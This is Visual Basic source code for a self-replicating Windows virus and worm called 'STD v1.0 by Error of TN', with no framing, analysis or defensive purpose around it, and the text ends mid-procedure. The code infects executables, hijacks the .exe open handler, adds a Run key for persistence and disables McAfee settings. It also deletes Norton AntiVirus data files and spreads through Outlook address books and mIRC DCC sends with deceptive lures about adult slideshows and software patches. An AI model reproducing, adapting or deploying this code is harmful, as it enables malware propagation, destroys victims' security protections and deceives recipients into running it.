'STD v1.0 by Error of TN
Public myDNA, myRNA, MyCode, STD, Grime, MySTD As String
Public FDateTime, oldDate, FDate, OldTime, FTime As String
Public SentWar As String
Const MySize = 17920
Const RSP_SIMPLE_SERVICE = 1
Const RSP_UNREGISTER_SERVICE = 0
Private iResult, hProg, idprog, iExit As Long
Const STILL_ACTIVE As Long = &H103
Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
Const Notification = "Hey, sorry I haven't written to you in a while.  " & _
                            "Well you could call it a while.  I'm writing this E-mail " & _
                            "to let you know of an attachment im sending with the next mail."
Const Notify = "Here is the e-mail attachment I told you about earlier, " & _
                        "It's an installation program for "
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Sub Form_Load()
On Error Resume Next
Dim process As Long
process = GetCurrentProcessId()
Call RegisterServiceProcess(process, RSP_SIMPLE_SERVICE)
Call AIDS
myDNA = App.EXEName
If Right(App.Path, 1) <> "\" Then
    myRNA = App.Path & "\"
End If
myRNA = myRNA & myDNA & ".exe"
If UCase(myRNA) = "C:\WINDOWS\SYSTEM\SYSTRAY_.EXE" Then
    STD = Command()
    For X = 1 To Len(STD)
        strck = UCase(Mid(STD, X, 1))
        Grime = Grime + strck
        If Right(Grime, 5) = ".EXE " Then
            Grime = Left(Grime, Len(Grime) - 1)
            MySTD = Right$(STD, Len(STD) - X)
            GoTo Trine
        End If
    Next X
Trine:
    ff = FreeFile
    FDateTime = FileDateTime(Grime)
    For w = 1 To Len(FDateTime)
        Scan = Mid(FDateTime, w, 1)
        If Scan = " " Then
            FDate = FDate + Scan
            FTime = Mid(FDateTime, w + 1, Len(FDateTime) - w)
            GoTo GotStamp
        End If
        FDate = FDate + Scan
    Next w
GotStamp:
    oldDate = Date$
    OldTime = Time$
    Date = FDate
    Time = FTime
    Open Grime For Binary Access Read As ff
        Dim Original As String
        Original = Space(LOF(ff))
        Get #ff, 1, Original
        If UCase(Right(Original, 3)) = "STD" Then
            Call Original_Jump
        End If
    Close #ff
    Open myRNA For Binary Access Read As #2
        Dim Herpes As String
        Herpes = Space(MySize)
        Get #2, 1, Herpes
    Close #2
    Open Grime For Binary Access Write As ff
        Put #ff, 1, Herpes
        Put #ff, MySize, Original
        Put #ff, LOF(ff) + 3, "STD"
    Close #ff
    Call Original_Jump
End If
InFx_SYS
End Sub
Public Sub InFx_SYS()
On Error Resume Next
Kill "C:\windows\system\systray_.exe"
ff = FreeFile
Open myRNA For Binary Access Read As #ff
    Dim MyCode As String
    MyCode = Space(MySize)
    Get #ff, 1, MyCode
Close
Open "C:\windows\system\systray_.exe" For Binary Access Write As #ff
    Put #ff, 1, MyCode
    Put #ff, LOF(ff) + 3, "STD"
Close
FileCopy "C:\windows\system\systray_.exe", "C:\windows\system\runtray_.dll"
Call Original_Jump
End Sub
Public Sub AIDS()
On Error Resume Next
w = Chr(34)
Open "C:\ModReg.reg" For Output As #1
    Print #1, "REGEDIT4"
    Print #1,
    Print #1, "[HKEY_CLASSES_ROOT\exefile\shell\open\command]"
    Print #1, "@=" & w & "\" & w & "C:\\windows\\system\\systray_.exe\" & w & " %1 %*" & w
    Print #1,
    Print #1, "[HKEY_LOCAL_MACHINE\Software\McAfee\Scan95]"
    Print #1, w & "SerialNum" & w & "=" & w & "STD v1.0 by Error of TN" & w
    Print #1, w & "CurrentVersionNumber" & w & "=" & w & "666" & w
    Print #1, w & "DAT" & w & "=" & w & "NONE" & w
    Print #1, w & "DATFile" & w & "=" & w & "-2000" & w
    Print #1, w & "VirusInfoURL" & w & "=" & w & "http://www.norton.com" & w
    Print #1, w & "bVShieldEnabled" & w & "=dword:00000000"
    Print #1,
    Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"
    Print #1, w & "SystemTray" & w & "=" & w & "C:\\Windows\\system\\systray_.exe" & w
Close #1
If Dir("C:\mirc", vbDirectory) <> "" Then
    Open "C:\mirc\script.ini" For Output As #1
        Print #1, "[script]"
        Print #1, "n0= on 1:TEXT:*sex*:#:{"
        Print #1, "n1= .notice $nick Hello, sorry to disturb you, but I just got a very kinky adult slideshow and was wondering if you would like a copy.  So I'm going to send you one."
        Print #1, "n2= /.copy C:\windows\system\runtray_.dll C:\windows\system\install_show.exe"
  	Print #1, "n3= /dcc send $nick C:\windows\system\install_show.exe"
        Print #1, "n4= }"
        Print #1, "n5= on 1:FILESENT:*.exe:.msg $nick Thanks for accepting it, hope you enjoy it!"
    Close
End If
modify = Shell("regedit /s C:\ModReg.reg", vbHide)
Kill "C:\ModReg.reg"
Kill "C:\Program Files\Norton AntiVirus\*.dat"
End Sub
Public Function IGotWyrms(Subject1 As String, Body1 As String, Optional Attachment1 As String)
On Error Resume Next
Dim S_and_M, B_and_D, Spawnme
Set S_and_M = CreateObject("Outlook.Application")
Set B_and_D = S_and_M.GetNameSpace("MAPI")
If S_and_M = "Outlook" Then
    B_and_D.Logon "Guest", "password"
    For y = 1 To B_and_D.AddressLists.Count
    Set AddyBook = B_and_D.AddressLists(y)
    X = 1
    Set Spawnme = S_and_M.CreateItem(0)
    For oo = 1 To AddyBook.AddressEntries.Count
        peep = AddyBook.AddressEntries(X)
        Spawnme.Recipients.Add peep
        X = X + 1
        If X > 100 Then oo = AddyBook.AddressEntries.Count
            Next oo
            Spawnme.Subject = Subject1
            Spawnme.Body = Body1
        If Attachment1 <> "" Then
                Spawnme.Attachments.Add Attachment1
        End If
            Spawnme.Send
            peep = ""
        Next y
        B_and_D.Logoff
    End If
End Function
Public Sub Original_Jump()
On Error Resume Next
If Grime = "" Or Grime = Empty Then Grime = myRNA
If Original = "" Or Original = Empty Then
    Open Grime For Binary Access Read As #3
        Original = LOF(3) - MySize
        If Original = 0 Then End
        Dim GetOrig As String
        GetOrig = Space(Original)
        Get #3, MySize, GetOrig
    Close #3
End If
hideit = Left(Grime, Len(Grime) - 4)
hideit = hideit & ".vxv"
Open hideit For Binary Access Write As #10
    Put #10, , GetOrig
Close #10
Close
Dim idprog As Long
Date = oldDate
Time = OldTime
If InStr(1, Minute(Now), 3, vbTextCompare) <> 0 Then
    Call IGotWyrms("Hey", Notification, "")
    SendWar = "1"
End If
idprog = Shell(hideit & " " & MySTD, vbNormalFocus)
hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idprog)
GetExitCodeProcess hProg, iExit
Do While iExit = STILL_ACTIVE
    DoEvents
    GetExitCodeProcess hProg, iExit
Loop
If Second(Now) >= "10" And Second(Now) <= "20" Then
    If SendWar = "1" Then
        Name "C:\windows\system\runtray_.dll" As "C:\windows\install_.exe"
        Randomize Timer
        Dim Note As String
        randmsg = Int(Rnd(1) * 5) + 1
        If randmsg = 1 Then Note = Notify & "an adult screensaver slideshow program"
        If randmsg = 2 Then Note = Notify & "an Outlook Service Release upgrade"
        If randmsg = 3 Then Note = Notify & "a Microsoft Explorer Patch"
        If randmsg = 4 Then Note = Notify & "a Desktop Game I got off the internet"
        If randmsg = 5 Then Note = Notify & "a brand-new MP3 player and plug-ins"
        Call IGotWyrms("Here it is", Note, "C:\windows\install_.exe")
        Name "C:\windows\install_.exe" As "C:\windows\system\runtray_.dll"
    End If
